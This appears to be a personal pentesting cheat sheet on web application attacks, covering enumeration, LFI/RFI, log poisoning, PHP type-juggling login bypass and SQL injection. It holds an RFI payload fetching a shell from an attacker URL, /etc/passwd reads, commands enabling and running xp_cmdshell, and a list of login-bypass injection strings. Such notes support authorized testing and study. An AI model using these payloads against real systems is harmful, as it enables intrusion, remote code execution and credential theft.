---
layout: default
---
<html>
<head>
    <title>Web Application Attacks</title>
    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
</head>

<hr>

<body>

    <h1>Web Application Attacks</h1>

    <hr>

    <h2>Strategy</h2>

    <li>Web directory enumeration</li>
    <ul>
        <li>Web Enumeration Tools:</li>
        <ul>
            <li>gobuster</li>
            <li>feroxbuster</li>
        </ul>
        <li>Web Enumeration Wordlists:</li>
        <ul>
            <li>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</li>
            <li>/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</li>
        </ul>
    </ul>

    <li>Interesting web pages to check</li>
    <ul>
        <li>Check for &lt;url&gt;/index.php/asp/aspx to try to determine which language the server uses.</li>
        <li>Error Page.  Go to non-existent url.</li>
        <li>README.md</li>
        <li>/robots.txt</li>
        <ul>
            <li>Admin Portals</li>
            <ul>
                <li>Common ones:</li>
                <ul>
                    <li>Tomcat Manager</li>
                    <li>phpMyAdmin</li>
                </ul>
            </ul>
        </ul>
    </ul>

    <li>Look for exploits</li>
    <ul>
        <li>Carefully look at different web app name variations (cutenews & cutephp)</li>
        <li>Search exploits for website names even if they look "custom" or meaningless</li>
    </ul>

    <li>Read all web pages</li>
    <ul>
        <li>Look for usernames</li>
        <li>Look at source code for all pages</li>
        <ul>
            <li>Hidden functions</li>
            <li>Comments with sensitive information</li>
        </ul>
    </ul>

    <li>Burp</li>
    <ul>
        <li>Inspect web page requests</li>
        <ul>
            <li>Hidden directories may be revealed</li>
            <ul>
                <li>GET request on /hello-world/ initiated a bunch of other GET requests behind the scenes and this revealed hidden web directories </li>
            </ul>
            <li>Interesting headers may be revealed</li>
        </ul>
    </ul>

    <li>Nikto</li>
    <ul>
        <li>High configurable open source web server scanner.  Not designed for stealth.  Especially useful for catching low hanging fruit.</li>
        <li>Unable to connect to https host</li>
        <ul>
            <li>MinProtocol = None</li>
            <li>CipherString = Default</li>
        </ul>
    </ul>

    <li>sql injection</li>
    <ul>
        <li>Test *all* input forms</li>
        <li>&lt;url&gt;.com/id=&lt;Test for sql injection&gt;</li>
    </ul>

    <li>Input Forms</li>
    <ul>
        <li>Test for LFI and RFI</li>
        <li>Play with input lengths</li>
    </ul>

    <li>Directory Traversal</li>
    <ul>
        <li>Look for links such as: <url>/test.php?page=mkdocs</li>
        <ul>
            <li>RFI</li>
            <ul>
                <li>page=http://&lt;attacker url&gt;/shell.php</li>
            </ul>
            <li>LFI</li>
            <ul>
                <li>?file=&lt;directory&gt;</li>
                <ul>
                    <li>try to change it to file=/etc/passwd or file=C:\boot.ini</li>
                </ul>
                <li>Log poisoning</li>
                <ul>
                    <li>LFI and code execution combo</li>
                </ul>
            </ul>
        </ul>
    </ul>

    <li>Log poisoning</li>
    <ul>
        <li>Check for &lt;log&gt;.php/asp/aspx</li>
        <ul>
            <li>If logs are keeping track of HTTP request user-agents then set user-agent to web shell code and then navigate to the log using LFI</li>
        </ul>
    </ul>

    <li>Check github page for web application</li>
    <ul>
        <li>Look for issues which may reveal vulnerabilities or exploits</li>
        <li>Look at file in web app directory, might be able to find something interesting to look for on the victim</li>
    </ul>

<br>

    <h2>Login Page</h2>

    <li>Password attack</li>
    <ul>
        <li>Common Credentials</li>
        <ul>
            <li>Check seclist wordlist for web app specific default credential lists.</li>
            <ul>
                <li>/usr/share/seclists/Passwords/Default-Credentials</li>
            </ul>
        </ul>
        <li>Brute force</li>
        <ul>
            <li>Hydra</li>
            <li>BurpSuite Intruder</li>
            <li>Wordpress - wpscan (also an overall vulnerability scanner)</li>
        </ul>
        <li>PHP Juggling Bug / Bypass Login</li>
        <ul>
            <li>Abuses how PHP interprets information</li>
            <li>Change login webrequest of: username=admin&password=admin</li>
            <li>To: username=admin&password[]=admin</li>
            <li>If this works, you will login without providing correct password</li>
        </ul>
    </ul>

    <li>Enumerate valid users</li>
    <ul>
        <li>Observe error message returned when attempting to login</li>
        <ul>
            <li>If you attempt to login and an error message returns saying "User does not exist, please try again", then you know that user does not exist.</li>
            <li>If you get an error message saying "Password is incorrect for this user" then you know that user exists.</li>
            <ul>
                <li>You can determine users that exist before attacking passwords.</li>
                <li>Try this same technique on the password recovery page.</li>
                <li>Automate user enumeration using wfuzz</li>
            </ul>
        </ul>
    </ul>

    <li>Sql injection</li>
    <li>nosql injection</li>

<br>

    <h2>SQL Injection</h2>
    <li>Preventing SQL injection</li>
    <ul>
        <li>Use parameterized queries, also known as prepared statements.  This puts parameters or placeholders into SQL statements.  The databased binds the values of the user input to the statement.  This prevents user input from manipulating SQL code.</li>
    </ul>

    <li>MSSQL</li>
    <ul>
        <li>xp_cmdshell</li>
        <ul>
            <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
            <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
        </ul>
        <table>
            <tr>
                <td>Enable xp_cmdshell</td>
                <td>
                    <table>
                        <tr>
                            <td>Step #1</td>
                            <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
                        </tr>
                        <tr>
                            <td>Step #2</td>
                            <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td>Execute xp_cmdshell</td>
                <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
            </tr>
        </table>
    </ul>

    <table>
        <tr>
            <td>Test for sql injections</td>
            <td>'<br>""<br>;<br>' or '1'='1-- -<br>' or 1=2-- -</td>
        </tr>
    </table>

    <table>
        <tr>
            <td>Bypass login</td>
            <td>
                ' or 1=1 --<br>' or 1=1-- -<br>' or 1=1-- -;<br>a' or 1=1 --<br>" or 1=1 --<br>a" or 1=1 --<br>' or 1=1 #<br>" or 1=1 #<br>or 1=1 --<br>' or 'x'='x<br>" or "x"="x<br>') or ('x'='x<br>") or ("x"="x<br>' or username LIKE '%admin%<br>
                <li>Login bypass examples:</li>
                <table>
                    <tr>
                        <td>USERNAME:</td>
                        <td>admin' or 'a'='a</td>
                    </tr>
                    <tr>
                        <td>PASSWORD:</td>
                        <td>'#</td>
                    </tr>
                    <tr>
                        <td>
                            <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
                            <br>turns into:<br>
                            <li>SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'</li>
                        </td>
                    </tr>
                    <tr>
                        <td> </td>
                        <td> </td>
                    </tr>
                    <tr>
                        <td>USERNAME:</td>
                        <td>' or 1=1 --</td>
                    </tr>
                    <tr>
                        <td>PASSWORD:</td>
                        <td>&lt;anything&gt;</td>
                    </tr>
                    <tr>
                        <td>
                            <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
                            <br>turns into:<br>
                            <li>SELECT * FROM users WHERE username = '' or 1=1 -- AND password = '&lt;anything&gt;'</li>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>